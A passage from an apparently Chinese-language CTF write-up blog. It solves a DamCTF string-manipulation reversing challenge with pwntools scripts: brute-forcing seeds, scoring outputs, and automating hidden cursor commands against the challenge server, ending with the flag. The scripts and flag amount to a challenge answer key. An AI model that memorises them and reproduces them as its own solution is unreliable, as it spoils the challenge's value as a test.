class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">binary_path = <span class="string">&#x27;./chal&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_current_line</span>(<span class="params">seed</span>):</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(seed).encode())</span><br><span class="line"></span><br><span class="line">    current_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            line = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Current:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">                current_line = line.strip().replace(<span class="string">&quot;Current: &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> current_line</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter start seed (a): &quot;</span>))</span><br><span class="line">    b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter end seed (b): &quot;</span>))</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">f&quot;output<span class="subst">&#123;a&#125;</span>~<span class="subst">&#123;b&#125;</span>.txt&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> seed <span class="keyword">in</span> <span class="built_in">range</span>(a, b):</span><br><span class="line">            current = get_current_line(seed)</span><br><span class="line">            line = <span class="string">f&quot;<span class="subst">&#123;seed&#125;</span>, <span class="subst">&#123;current&#125;</span>&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            f.write(line + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Output saved to <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>评估：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line">target_str = <span class="string">&quot;episode3,57min34sec&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_score</span>(<span class="params">current_str, target_str</span>):</span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    min_len = <span class="built_in">min</span>(<span class="built_in">len</span>(current_str), <span class="built_in">len</span>(target_str))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_len):</span><br><span class="line">        score += <span class="built_in">abs</span>(<span class="built_in">ord</span>(current_str[i]) - <span class="built_in">ord</span>(target_str[i]))</span><br><span class="line">    score += <span class="built_in">abs</span>(<span class="built_in">len</span>(current_str) - <span class="built_in">len</span>(target_str)) * <span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    best_seed = <span class="literal">None</span></span><br><span class="line">    best_score = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    best_current_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    files = glob.glob(<span class="string">&quot;output*.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> files:</span><br><span class="line">        <span class="built_in">print</span>(file_name)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.readlines()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            parts = line.strip().split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) != <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            seed, current_str = parts</span><br><span class="line">            seed = <span class="built_in">int</span>(seed)</span><br><span class="line">            score = calculate_score(current_str, target_str)</span><br><span class="line">            <span class="keyword">if</span> score &lt; best_score:</span><br><span class="line">                best_score = score</span><br><span class="line">                best_seed = seed</span><br><span class="line">                best_current_str = current_str</span><br><span class="line">                </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Seed: <span class="subst">&#123;seed&#125;</span>, Current: <span class="subst">&#123;current_str&#125;</span>, Score: <span class="subst">&#123;score&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nBest Seed: <span class="subst">&#123;best_seed&#125;</span>, Best Current String: <span class="subst">&#123;best_current_str&#125;</span>, Best Score: <span class="subst">&#123;best_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到最佳初始str：</p>
<p><code>Best Seed: 47863, Best Current String: sg^bsdf+&quot;*7~yZ4&gt;&#123;ac, Best Score: 161</code></p>
<p>calls函数负责打印出现的面板：</p>
<p><strong>call1: 打印当前步数和最大步数<br>call2: 打印目标字符串<br>call3: 打印当前字符串<br>call4: 打印下面的横线和提示符 &gt;</strong></p>
<p>接下来查看每个字节码的作用：</p>
<table>
<thead>
<tr>
<th><strong>输入值</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>对当前字节增加3~5的随机整数</td>
</tr>
<tr>
<td>3</td>
<td>对当前字节减去1~3随机整数</td>
</tr>
<tr>
<td>7</td>
<td>修改索引为7的字节为7</td>
</tr>
<tr>
<td>8</td>
<td>将当前字节与其后第二个字节交换</td>
</tr>
<tr>
<td>9</td>
<td>将当前字节与其前第一个字节交换</td>
</tr>
<tr>
<td>15</td>
<td>将当前字符改为“G”</td>
</tr>
<tr>
<td>19</td>
<td>将当前字符改为“c”</td>
</tr>
<tr>
<td>22</td>
<td>将当前字符改为“;”</td>
</tr>
<tr>
<td>24</td>
<td>将当前字符改为“q”</td>
</tr>
<tr>
<td>57</td>
<td>将当前字符改为“W”</td>
</tr>
</tbody></table>
<p>发现没有提供可以改变当前字节指向位置的函数，其始终指向19个字节的最中间的字节，查找xref后发现有两个函数可以改变cursor的位置，这些函数在getinput中被调用但是无法显式查看，猜测是某种异常处理机制，查看汇编后发现，如果输入内容是<code>l</code>就可以实现指针左移，是<code>r</code>就可以实现右移，并且不消耗步数，接下来构造自动化payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">remote_host = <span class="string">&quot;itsdatanotdata.chals.damctf.xyz&quot;</span></span><br><span class="line">remote_port = <span class="number">39531</span></span><br><span class="line"></span><br><span class="line">target_str = <span class="string">&quot;episode3,57min34sec&quot;</span></span><br><span class="line">preset_chars = &#123;</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="number">15</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="number">19</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>: <span class="number">22</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="number">24</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="number">57</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_closest_char</span>(<span class="params">current_char, target_char</span>):</span><br><span class="line">    closest_char = <span class="literal">None</span></span><br><span class="line">    min_diff = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> preset_chars:</span><br><span class="line">        diff = <span class="built_in">abs</span>(<span class="built_in">ord</span>(ch) - <span class="built_in">ord</span>(target_char))</span><br><span class="line">        <span class="keyword">if</span> diff &lt; min_diff:</span><br><span class="line">            min_diff = diff</span><br><span class="line">            closest_char = ch</span><br><span class="line">    <span class="keyword">return</span> closest_char, min_diff</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_current_string</span>(<span class="params">io</span>):</span><br><span class="line">    buffer = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = io.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        buffer += chunk</span><br><span class="line">        <span class="built_in">print</span>(chunk.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        ansi_escape = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">rb&#x27;(?:\x1B[@-Z\\-_]|[\x08\x0D]|\x1B$$[0-9;]*m)&#x27;</span>)</span><br><span class="line">        clean_buffer = ansi_escape.sub(</span><br><span class="line">            <span class="string">b&#x27;&#x27;</span>, buffer).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        lines = clean_buffer.splitlines()</span><br><span class="line">        current_lines = [line <span class="keyword">for</span> line <span class="keyword">in</span> lines <span class="keyword">if</span> <span class="string">&quot;Current:&quot;</span> <span class="keyword">in</span> line]</span><br><span class="line">        <span class="keyword">if</span> current_lines:</span><br><span class="line">            full_line = current_lines[-<span class="number">1</span>].strip()</span><br><span class="line">            start_idx = full_idx = full_line.find(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span></span><br><span class="line">            current_str = full_line[start_idx:].strip().split()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> current_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(remote_host, remote_port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending init seed: 47863&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;47863&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Sending &#x27;l&#x27; (<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/9)&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&quot;l&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target_str)):</span><br><span class="line">        target_char = target_str[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                current_str = read_current_string(io)</span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[!] Connection closed by server. Exiting.&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> current_str <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(current_str):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            current_char = current_str[i]</span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">f&quot;\nProcessing char <span class="subst">&#123;i&#125;</span>: Target &#x27;<span class="subst">&#123;target_char&#125;</span>&#x27;, Current &#x27;<span class="subst">&#123;current_char&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> current_str == target_str:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[✓] Full match detected. Exiting.&quot;</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> current_char == target_char:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;[✓] Matched &#x27;<span class="subst">&#123;target_char&#125;</span>&#x27;, moving to next character.&quot;</span>)</span><br><span class="line">                io.sendline(<span class="string">b&quot;r&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            closest_char, closest_diff = calculate_closest_char(</span><br><span class="line">                current_char, target_char)</span><br><span class="line">            current_diff = <span class="built_in">abs</span>(<span class="built_in">ord</span>(current_char) - <span class="built_in">ord</span>(target_char))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> closest_char <span class="keyword">and</span> closest_diff &lt; current_diff:</span><br><span class="line">                cmd = <span class="built_in">str</span>(preset_chars[closest_char]).encode()</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;[+] Using preset char &#x27;<span class="subst">&#123;closest_char&#125;</span>&#x27; via command <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line">                io.sendline(cmd)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(current_char) &lt; <span class="built_in">ord</span>(target_char):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Sending command 2 (+)&quot;</span>)</span><br><span class="line">                io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Sending command 3 (-)&quot;</span>)</span><br><span class="line">                io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] All characters matched!&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>flag：<font color=deepskyblue><strong>dam{git_branch_origin._you_are_a_pulled_one}</strong></font>.</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/05/21/xuanyuan_25/"
      title="“轩辕杯”云盾砺剑CTF挑战赛 2025 WriteUp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        “轩辕杯”云盾砺剑CTF挑战赛 2025 WriteUp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/05/07/minil_25/"
      title="Mini L-CTF 2025 WriteUp"
     >

    <p class="title-text">
      
        Mini L-CTF 2025 WriteUp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
